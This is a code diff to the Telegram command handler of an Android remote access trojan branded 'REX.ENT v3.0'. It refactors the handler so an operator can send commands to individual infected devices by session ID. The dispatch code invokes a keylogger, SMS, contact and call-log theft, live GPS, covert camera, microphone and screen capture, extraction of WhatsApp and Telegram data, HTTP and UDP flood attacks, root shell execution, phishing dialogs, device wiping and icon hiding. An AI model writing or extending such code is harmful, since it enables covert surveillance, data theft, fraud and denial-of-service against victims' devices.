@@ -42,215 +42,100 @@ public class CommandHandler {
     }
 
     public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
-        String[] args = text.split(" ");
-        String cmd = args[0].toLowerCase();
+        String[] parts = text.trim().split("\\s+");
+        String cmd = parts[0].toLowerCase();
 
+        if (cmd.equals("/start") || cmd.equals("/help")) {
+            processGlobal(cmd);
+            return;
+        }
+
+        String target = null;
+        String[] realArgs;
+        if (parts.length >= 2) {
+            target = parts[1].toUpperCase();
+            realArgs = new String[parts.length - 2];
+            System.arraycopy(parts, 2, realArgs, 0, realArgs.length);
+        } else {
+            return;
+        }
+
+        String mySession = BotConfig.SESSION_ID.toUpperCase();
+        if (!target.equals("ALL") && !target.equals(mySession)) {
+            return;
+        }
+
+        execute(cmd, realArgs);
+    }
+
+    private void processGlobal(String cmd) {
+        if (cmd.equals("/start")) {
+            TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\n" +
+                "<b>Session:</b> <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
+                "Use <code>/cmd &lt;session&gt; &lt;args&gt;</code> to target a device.\n" +
+                "<code>/cmd " + BotConfig.SESSION_ID + " /info</code>");
+        } else {
+            TelegramApi.sendMessage("Format: <code>/command SESSION_XXXX [args]</code>\n" +
+                "Examples:\n" +
+                "<code>/info " + BotConfig.SESSION_ID + "</code>\n" +
+                "<code>/ls " + BotConfig.SESSION_ID + " /sdcard</code>");
+        }
+    }
+
+    private void execute(String cmd, String[] args) {
         try {
             switch (cmd) {
-                case "/start":
-                    TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\nID: <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
-                            "<b>📁 File:</b> /ls /download /rm /rename\n" +
-                            "<b>📍 GPS:</b> /location /gps\n" +
-                            "<b>💬 SMS:</b> /sms_list /sendsms /delsms\n" +
-                            "<b>📞 Calls:</b> /calls\n" +
-                            "<b>👤 Contacts:</b> /contacts\n" +
-                            "<b>📷 Camera:</b> /photo_front /photo_back /record\n" +
-                            "<b>🎙 Audio:</b> /mic /liveaudio\n" +
-                            "<b>🖥 Screen:</b> /screenshot /screenrecord\n" +
-                            "<b>⌨ Keylog:</b> /keylog_start /keylog_stop /keylog_dump\n" +
-                            "<b>📱 Device:</b> /info /apps /battery /network /permissions\n" +
-                            "<b>📋 Clipboard:</b> /clipboard /setclip\n" +
-                            "<b>🔔 Notif:</b> /notif /fakenotif\n" +
-                            "<b>📦 Steal:</b> /steal_images /steal_docs /extract_wa /extract_tg\n" +
-                            "<b>🌐 DDoS:</b> /httpflood /udpflood\n" +
-                            "<b>⚙ Shell:</b> /shell /sush\n" +
-                            "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy /hideicon /autostart");
-                    break;
-
-                // === FILE MANAGER ===
+                case "/info": deviceInfoManager.sendDeviceInfo(); break;
                 case "/ls":
-                    fileManager.listDirectory(args.length > 1 ? args[1] : Environment.getExternalStorageDirectory().getAbsolutePath());
+                    fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath());
                     break;
-                case "/download":
-                    if (args.length > 1) fileManager.uploadFile(args[1]);
-                    break;
-                case "/rm":
-                    fileManager.deleteFile(args.length > 1 ? args[1] : "");
-                    break;
-                case "/rename":
-                    fileManager.renameFile(args.length > 1 ? args[1] : "", args.length > 2 ? args[2] : "");
-                    break;
-
-                // === SMS ===
-                case "/sms_list":
-                    smsManager.sendSMSList(args.length > 1 ? Integer.parseInt(args[1]) : 10);
-                    break;
-                case "/sendsms":
-                    smsManager.sendSMS(args.length > 1 ? args[1] : "", args.length > 2 ? joinArgs(args, 2) : "");
-                    break;
-                case "/delsms":
-                    smsManager.deleteSMS(args.length > 1 ? args[1] : "");
-                    break;
-
-                // === CALLS ===
-                case "/calls":
-                    callManager.sendCallLogs(args.length > 1 ? Integer.parseInt(args[1]) : 20);
-                    break;
-
-                // === CONTACTS ===
-                case "/contacts":
-                    contactManager.sendContacts();
-                    break;
-
-                // === LOCATION ===
-                case "/location":
-                    locationManager.sendCurrentLocation();
-                    break;
-                case "/gps":
-                    locationManager.startLiveGPS();
-                    break;
-
-                // === CAMERA ===
-                case "/photo_front":
-                    cameraManager.takePhoto(1);
-                    break;
-                case "/photo_back":
-                    cameraManager.takePhoto(0);
-                    break;
-                case "/record":
-                    cameraManager.recordVideo(args.length > 1 ? Integer.parseInt(args[1]) : 10);
-                    break;
-
-                // === AUDIO ===
-                case "/mic":
-                    audioManager.recordAudio(args.length > 1 ? Integer.parseInt(args[1]) : 10);
-                    break;
-                case "/liveaudio":
-                    audioManager.startLiveStream();
-                    break;
-
-                // === SCREEN ===
-                case "/screenshot":
-                    screenManager.takeScreenshot();
-                    break;
-                case "/screenrecord":
-                    screenManager.startScreenRecord(args.length > 1 ? Integer.parseInt(args[1]) : 10);
-                    break;
-
-                // === KEYLOGGER ===
-                case "/keylog_start":
-                    keyloggerManager.start();
-                    break;
-                case "/keylog_stop":
-                    keyloggerManager.stop();
-                    break;
-                case "/keylog_dump":
-                    keyloggerManager.sendLogs();
-                    break;
-
-                // === DEVICE INFO ===
-                case "/info":
-                    deviceInfoManager.sendDeviceInfo();
-                    break;
-                case "/apps":
-                    appManager.listInstalledApps();
-                    break;
-                case "/battery":
-                    deviceInfoManager.sendBatteryStatus();
-                    break;
-                case "/network":
-                    deviceInfoManager.sendNetworkInfo();
-                    break;
-                case "/permissions":
-                    deviceInfoManager.sendPermissions();
-                    break;
-
-                // === CLIPBOARD ===
-                case "/clipboard":
-                    ClipboardManager.getClipboard(context);
-                    break;
-                case "/setclip":
-                    ClipboardManager.setClipboard(context, joinArgs(args, 1));
-                    break;
-
-                // === NOTIFICATIONS ===
-                case "/notif":
-                    NotificationManager.dumpNotifications();
-                    break;
-                case "/fakenotif":
-                    NotificationManager.sendFake(context, args.length > 1 ? args[1] : "Alert", args.length > 2 ? joinArgs(args, 2) : "Message");
-                    break;
-
-                // === STEALER ===
-                case "/steal_images":
-                    StealerManager.stealImages(context);
-                    break;
-                case "/steal_docs":
-                    StealerManager.stealDocuments(context);
-                    break;
-                case "/extract_wa":
-                    socialMediaManager.extractWhatsApp();
-                    break;
-                case "/extract_tg":
-                    socialMediaManager.extractTelegram();
-                    break;
-
-                // === NETWORK ===
-                case "/httpflood":
-                    NetworkManager.httpFlood(args.length > 1 ? args[1] : "http://example.com", args.length > 2 ? Integer.parseInt(args[2]) : 100);
-                    break;
-                case "/udpflood":
-                    NetworkManager.udpFlood(args.length > 1 ? args[1] : "127.0.0.1", args.length > 2 ? Integer.parseInt(args[2]) : 53, args.length > 3 ? Integer.parseInt(args[3]) : 30);
-                    break;
-
-                // === SHELL ===
-                case "/shell":
-                    ShellManager.executeCommand(joinArgs(args, 1));
-                    break;
-                case "/sush":
-                    ShellManager.executeRootCommand(joinArgs(args, 1));
-                    break;
-
-                // === SYSTEM ===
-                case "/openurl":
-                    phishingManager.openURL(args.length > 1 ? args[1] : "");
-                    break;
-                case "/toast":
-                    SystemManager.showToast(context, joinArgs(args, 1));
-                    break;
-                case "/phish":
-                    PhishingManager.showPhishingDialog(context, args.length > 1 ? args[1] : "Google", args.length > 2 ? joinArgs(args, 2) : "Verify your account");
-                    break;
-                case "/vibrate":
-                    SystemManager.vibrate(context, args.length > 1 ? Integer.parseInt(args[1]) : 1000);
-                    break;
-                case "/playsound":
-                    SystemManager.playSound(context);
-                    break;
-                case "/lock":
-                    SystemManager.lockDevice(context);
-                    break;
-                case "/wipe":
-                    SystemManager.wipeDevice(context);
-                    break;
-                case "/destroy":
-                    SystemManager.selfDestruct(context);
-                    break;
-                case "/hideicon":
-                    SystemManager.hideIcon(context);
-                    break;
-                case "/autostart":
-                    SystemManager.enableAutostart(context);
-                    break;
-
-                // === SOCIAL MEDIA AUDIT ===
-                case "/socmed":
-                    socialMediaManager.auditSocialMedia();
-                    break;
-
-                case "/help":
-                    TelegramApi.sendMessage("Too many commands. Type /start for full list.");
-                    break;
+                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
+                case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
+                case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
+                case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
+                case "/sendsms": smsManager.sendSMS(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
+                case "/delsms": smsManager.deleteSMS(args.length > 0 ? args[0] : ""); break;
+                case "/calls": callManager.sendCallLogs(args.length > 0 ? Integer.parseInt(args[0]) : 20); break;
+                case "/contacts": contactManager.sendContacts(); break;
+                case "/location": locationManager.sendCurrentLocation(); break;
+                case "/gps": locationManager.startLiveGPS(); break;
+                case "/photo_front": cameraManager.takePhoto(1); break;
+                case "/photo_back": cameraManager.takePhoto(0); break;
+                case "/record": cameraManager.recordVideo(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
+                case "/mic": audioManager.recordAudio(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
+                case "/liveaudio": audioManager.startLiveStream(); break;
+                case "/screenshot": screenManager.takeScreenshot(); break;
+                case "/screenrecord": screenManager.startScreenRecord(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
+                case "/keylog_start": keyloggerManager.start(); break;
+                case "/keylog_stop": keyloggerManager.stop(); break;
+                case "/keylog_dump": keyloggerManager.sendLogs(); break;
+                case "/apps": appManager.listInstalledApps(); break;
+                case "/battery": deviceInfoManager.sendBatteryStatus(); break;
+                case "/network": deviceInfoManager.sendNetworkInfo(); break;
+                case "/permissions": deviceInfoManager.sendPermissions(); break;
+                case "/clipboard": ClipboardHelper.getClipboard(context); break;
+                case "/setclip": ClipboardHelper.setClipboard(context, joinArgs(args, 0)); break;
+                case "/notif": NotificationManager.dumpNotifications(); break;
+                case "/fakenotif": NotificationManager.sendFake(context, args.length > 0 ? args[0] : "Alert", args.length > 1 ? joinArgs(args, 1) : "Message"); break;
+                case "/steal_images": StealerManager.stealImages(context); break;
+                case "/steal_docs": StealerManager.stealDocuments(context); break;
+                case "/extract_wa": socialMediaManager.extractWhatsApp(); break;
+                case "/extract_tg": socialMediaManager.extractTelegram(); break;
+                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "http://example.com", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
+                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "127.0.0.1", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
+                case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); break;
+                case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); break;
+                case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); break;
+                case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); break;
+                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify your account"); break;
+                case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); break;
+                case "/playsound": SystemManager.playSound(context); break;
+                case "/lock": SystemManager.lockDevice(context); break;
+                case "/wipe": SystemManager.wipeDevice(context); break;
+                case "/destroy": SystemManager.selfDestruct(context); break;
+                case "/hideicon": SystemManager.hideIcon(context); break;
+                case "/autostart": SystemManager.enableAutostart(context); break;
+                case "/socmed": socialMediaManager.auditSocialMedia(); break;
             }
         } catch (Exception e) {
             TelegramApi.sendMessage("❌ Error: " + e.getMessage());
